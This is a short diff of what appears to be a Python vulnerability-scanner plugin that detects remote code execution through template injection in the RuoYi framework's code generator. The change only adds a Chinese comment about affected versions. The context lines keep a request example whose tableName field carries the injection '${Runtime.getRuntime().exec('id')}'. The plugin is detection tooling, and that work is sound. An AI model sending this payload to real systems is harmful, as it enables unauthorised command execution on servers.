@@ -40,7 +40,7 @@ class RuoyiGenRcePlugin(PluginBase):
         "  -d \"tableId=1&tableName=sys_user_${Runtime.getRuntime().exec('id')}&comments=test\""
     )
     # D2：代码生成器 RCE 全版本存在（取决于是否启用代码生成功能）
-    affected_versions = ""
+    affected_versions = ""  # 代码生成模块 SSTI，低版本更普遍；高版本未修复前全版本适用
     # D12：CVSS v3.1 + 合规映射
     cvss_vector = "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
     compliance = "等保2.0:8.1.3;OWASP:A03:2021"
